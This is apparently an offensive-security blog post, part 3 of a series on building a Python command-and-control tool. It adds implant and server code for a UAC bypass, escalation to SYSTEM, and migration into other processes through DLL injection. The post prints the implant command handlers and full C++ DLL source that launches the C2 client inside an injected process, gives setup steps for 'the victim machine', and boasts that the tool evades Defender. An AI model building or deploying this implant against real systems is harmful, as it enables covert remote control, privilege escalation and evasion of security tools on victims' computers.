---
title:  "Create your own C2 using Python- Part 3"
header:
  teaser: "/assets/images/c2_part3.png"
categories:
  - C2
  - Python
tags:
  - C2
  - Python
  - sockets
  - migrate
  - getsystem
  - uac bypass
  - '2024'
  - metasploit
  - custom
  - DIY
  - command and control
---

Twas 5 days before Christmas, and all through the night.  Not a sound was heard, because we bypassed EDR with no alerts in sight!  🎅

LOL, what's happening everyone, and welcome to `Part 3` of our C2 series!  Also all joking aside, it's true you know.  This super lightweight, Python🐍 driven C2 is currently **NOT** detected by Defender.  It's every bit as basic and straightforward as Metasploit with all the familiar functionality.  Yet no need to bypass EDR because it bypasses it by default!  Now, why should that excited you?  Well, we are now incorporating some new features that really make this lightweight C2 actually useful in a live pentest scenario.  The following new features have been added in Part 3:

- **getsystem**
- **UAC bypass**
- **migrate**

We can now escalate our privs from **MEDIUM** context all the way to **SYSTEM** if you want!  Also, want to migrate into another process?  No problem, we can do that too 😸  I'm using code from previously shared blog posts btw.  The `getsystem` technique uses functionality built in to ElevationStation, and elevation kit I wrote in c++ a while back.  The `UAC Bypass` technique borrows from a UAC bypass method I posted about not that long ago.  We're basically stealing ctfmon's UIaccess token and then using powershell to sendkeys to `azman.msc`, forcing it to open an elevated program of our choosing.  Lastly, the `migrate` functionality I don't believe I actually blogged about yet, come to think of it.  This is brand new to this particular blog post, and I'm exciting to show it off 😺  Basically, if you're a medium context user, you can create another process and migrate into it.  If you're a user within an elevated process, you can migrate into a `SYSTEM` process such as *WinLogon*, etc  Each time you migrate, you get a new connection sent to your C2.  It's really pretty fun and useful!

Well, let's get down to it then.  As usual, I'm going to quickly run through the code with some brief explanations along the way. 

***Part 3 - Adding in UAC Bypass functionality***
-

Instead of posting all the Python code, I'm going to ask that you reference the code from the previous posts.  That way, I can get straight to the new features and post smaller snippits.  I think that will help explain the new additions to our C2 better and make things easier to follow.

> **Prep**

- Be sure to open and compile the UIAccess_bypassUAC C++ project.  
- Rename the resulting `.exe` file to `UACBypass.exe` and copy/upload it to the `c:\users\public directory` on the victim machine.  This will be used as our bypass UAC utility and integrated into the C2.
- Finally, copy/upload the `getitdone.ps1` file to the victim box, also in the `c:\users\public` directory.  I was lazy and called it getitdone.  feel free to change it if you like lol.  This is the script that issues the sendkeys portion of the UAC bypass and opens an elevated executable using `azman.msc`

**> Server side**

```python
if choice == "bypassuac":
            print("checking to see if this user is a member of the admins group...")
            if "True" in clientdata[selection][2]:
                print("Nice! You're in the administrators group.  continuing...")
            else:
                print("Sorry, you're either already SYSTEM or you need to be a member of the administrators groups for this to work")
                time.sleep(4)
                return
            #attackerip=input(Fore.YELLOW + "[What is the IP of your attacker box (likely this box you're using right now)]: $ " + Fore.WHITE)
            #attackerport=input(Fore.YELLOW + "[What is the port of your attacker box (likely this box you're using right now)]: $ " + Fore.WHITE)
            print("Attempting to elevate privileges from medium to high integrity with current user...")
            try:
                clientlist[selection][1].send(b":bypassuac:\n")
                print(Fore.GREEN + "[+] command successfully sent!" + Fore.WHITE)
                uacstatus=clientlist[selection][1].recv(1024)
                uacstatus = uacstatus.decode('UTF-8')
                print(uacstatus)
                time.sleep(4)
            except:
                print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
```

> **Client / Implant code** 🧟

```python
if ":bypassuac:" in data:
            if str(shell.IsUserAnAdmin()) == "True":
                print("LOL, good news!  you're already in an elevated shell!")
                client.send(b"Already in elevated shell!\n")
            elif os.getlogin() == "SYSTEM":
                print("You're already SYSTEM ;)")
                client.send(b"You're already SYSTEM ;)\n")
            else:
                print("Attempting to bypassUAC now!")
                proc = subprocess.Popen("C:/Users/public/UACBypass.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                #proc = subprocess.Popen(["c:/users/robbi/source/repos/UACBypass/x64/Debug/UACBypass.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                #client.send(b"returned output: \n"+proc.stdout.read())
                time.sleep(2)
                client.send(b"[+] Wrapping things up!  You should have an elevated shell soon!\n")
```

You should be greeted with a new elevated connection sent to your C2 server!  Full source code located in the usual spot on my GitHub.  I'll reference it toward the bottom of this post.

![image](https://github.com/user-attachments/assets/7161461a-554a-43cb-80f6-465e21cb969d)

![image](https://github.com/user-attachments/assets/18a26f56-e388-4148-a80d-56c250f3f515)

![image](https://github.com/user-attachments/assets/ed627306-ece6-4833-8204-887a0ecbe6fa)

Nice!  I like this Bypass technique as it is very programatically sound.  What I mean by that is that it's hard for Defender to differentiate between malicious tampering and basic handling of sending keys and swapping out tokens.  Other than the executable we eventually run in an elevated manner, there's nothing really inherently suspicious about this UAC bypass technique.  We're not messing with the registry, tampering with environment varables, or modifying files in any way.  It's fairly innocuous if you ask me.  😄

***Part 3 - Adding in GetSystem for SYSTEM elevation functionality***
-

Privilege escalation is one of my favorite aspects of offensive security.  I love exploring all the various ways one can achieve `SYSTEM` level permissions in a pentest engagement.  It's where my twitter/X handle comes from, my passion for exploring the many facets and fascinations behind privilege escalation.  This next new module I'd like to introduce in Part 3 of this C2 series will be integrating my **ElevationStation** project code to help us elevate from an administrator/elevated process to **SYSTEM** privileges.

> **Prep**

Open the `elevationstation.sln` project file and compile it.  Copy/upload the compiled executable to the victim's `c:\users\public` directory.  We will be using this to escalate to **SYSTEM**!

> **Server-side code**

```python
 if choice == "getsystem":
            print("[+] Please wait ~15-20 seconds and you'll receive another connection with your new [SYSTEM] shell!")
            print("We're using elevationstation's Trusted Installer technique to get all privileges for the shell btw ;) ")
            clientlist[selection][1].send(b":getsystem:\n")
            systemstatus=clientlist[selection][1].recv(1024)
            systemstatus = systemstatus.decode('UTF-8')
            print(systemstatus)
            time.sleep(4)
            #getsystem=clientlist[selection][1].recv(1024)
            #getsystem = whoami.decode('UTF-8')
            #print("Results: ", getsystem)
            #time.sleep(2)
```

> **Client / Implant code** 🧟‍♂️

```python
if ":getsystem:" in data:
            victim=os.getlogin()
            if str(shell.IsUserAnAdmin()) == "False":
                print("Sorry but you need an elevated command prompt for escalating to [SYSTEM]")
                client.send(b"Sorry but you need an elevated command prompt for escalating to [SYSTEM]\n")
            elif os.getlogin() == "SYSTEM":
                print("You're already SYSTEM ;)")
                client.send(b"You're already SYSTEM ;)\n")
            else:
                proc = subprocess.Popen(["C:/Users/public/elevationstation.exe","-ti"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                #client.send(b"returned output: \n"+proc.stdout.read())
                time.sleep(7)
                #elevcli="c:/users/"+victim+"/AppData/Local/Programs/Python/Python313/python.exe c:/users/"+victim+"/documents/github/elevationstation_local/elev8cli.py\n"
                #proc.stdin.write(elevcli.encode('UTF-8'))
                proc.stdin.write(b"C:/Users/public/elev8cli.exe\n")
                proc.stdin.flush()
                client.send(b"[+] Wrapping things up!  You should have SYSTEM soon!\n")
                for elevateproc in psutil.process_iter():
                    if "elevationstation" in elevateproc.name():
                        elevateproc.kill()
```

Let's go on ahead and select our newly acquired elevated session:

![image](https://github.com/user-attachments/assets/c9844e5d-50e5-4035-87e5-aa00fc1bd1c5)

Next, we want to run `getsystem` like so:

![image](https://github.com/user-attachments/assets/745a4dd0-c7e4-420a-bc96-9ab82486ce4c)

Check it out, SYSTEM privs!!!!

![image](https://github.com/user-attachments/assets/4fdfe3ca-8166-4068-afbd-0dd9bc96b449)

I can't go into all the specifics on how this works.  That would make for quite the lengthy blog post 😸  I highly recommend checking out my ElevationStation series on my blog and see how it all works!  Last up, let's check out the migrate process functionality!

***Part 3 - Migrating our connection(s) into other processes!***
-

Okay, our last implementation for today!  Save the best for last right? 😸  For this technique, we have a little bit of prep to do first.  This technique uses DLL injection to inject into another process and migrate our session.  I'll include the prep files below.  As I said toward the beginning of this post, the `migrate` feature can migrate a non-admin session into another process, I think I made it `Notepad` by default.  If you're an admin, you can migrate into any process you like.

> **Prep**

- Make sure the C2 client is in the victim's `c:\users\public` directory.  This file: `c2client_part3.py`
- You'll also want to edit and compile this dll source code; adjust it accordingly.  Place it in the `c:\temp` folder.  I don't recall why I chose `temp` over `c:\users\public`, but there you have it.  

```c++
#include <windows.h>

DWORD WINAPI ThreadProc(LPVOID lpParam) {
    // Command to be executed by WinExec
	//You'll want to edit this to make sure the path lines up with your installation of python on the victim machine
	//or better yet, compile this to an exe so you don't have to reference the python path :)
    WinExec("c:\\users\\robbi\\AppData\\Local\\Programs\\Python\\Python313\\python.exe c:\\users\\public\\c2client_part3.py", 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        // Disable thread library calls to optimize performance
        DisableThreadLibraryCalls(hModule);

        // Create a new thread to run the command
        HANDLE hThread = CreateThread(
            NULL,       // default security attributes
            0,          // use default stack size
            ThreadProc, // thread function
            NULL,       // argument to thread function
            0,          // use default creation flags
            NULL);      // returns the thread identifier

        if (hThread) {
            // Close the thread handle as we don't need it anymore
            CloseHandle(hThread);
        }
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

- Next, open and compile the `migrator.sln` and `migrator2.sln` projects and move the compiled executables into the `c:\users\public` directory 😺

Okay, I think that should do it!  Let's go ahead and navigate into an elevated session in our Zombie list and then check out our commands.  We're going to want to use the `migrate` command:

![image](https://github.com/user-attachments/assets/20ef95ee-f746-4603-b6c7-33eecf06afcc)

I'm going to go with the process ID for the `OfficeClickToRun` process:

![image](https://github.com/user-attachments/assets/03776271-9d98-4786-8b75-35592bf86cb1)

Let 'er rip!!!!

![image](https://github.com/user-attachments/assets/e9afb48e-7e7e-4330-8f53-5e763daf1b18)

There it is 😄

![image](https://github.com/user-attachments/assets/235544c4-19ff-4f0d-ad78-04af18212dcf)

![image](https://github.com/user-attachments/assets/d6ab9822-695c-4958-8034-6c1434c99120)

I think this may be the most fun I've had writing a post in quite some time!  It's been a bit as I've been working on some other projects the last couple of weeks, but I knew it was high time to do another post for our C2 series!  I hope you've enjoyed this series as much as I have, and as always, the source code can be found in this folder: 

**2024-12-20-Create your own C2 using Python - Part 3**

**Located here**: [C2 Part 3 - Files](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2024-12-20-Create%20your%20own%20C2%20using%20Python%20-%20Part%203)

If you truly enjoy this content, please spread the word and let others know about this blog.  I love teaching about the many exciting facets of infosec and I try to keep my posts simple and easy to follow.  Later everyone!
